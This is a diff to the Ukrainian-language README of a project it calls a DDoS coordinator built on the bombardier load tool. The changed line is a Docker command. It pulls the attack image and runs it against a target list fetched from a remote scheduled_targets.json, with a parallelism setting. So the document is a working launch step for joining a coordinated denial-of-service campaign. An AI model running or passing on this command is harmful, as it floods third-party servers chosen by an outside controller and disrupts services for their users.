@@ -9,7 +9,7 @@ DDOS координатор, використовуючий bombardier на од
 
 Docker:
 
-Запуск через докер: `docker run --env SCHEDULED_TARGETS_URL=https://gloryforukraine.pages.dev/scheduled_targets.json --env PARALLEL_FACTOR=5 --cpus=".7" --rm -it archdev/gloryforukraine`
+Запуск через докер: `docker pull archdev/gloryforukraine:latest && docker run --env SCHEDULED_TARGETS_URL=https://gloryforukraine.pages.dev/scheduled_targets.json --env PARALLEL_FACTOR=5 --cpus=".7" --rm -it archdev/gloryforukraine:latest`
 
 Билд кода:
 
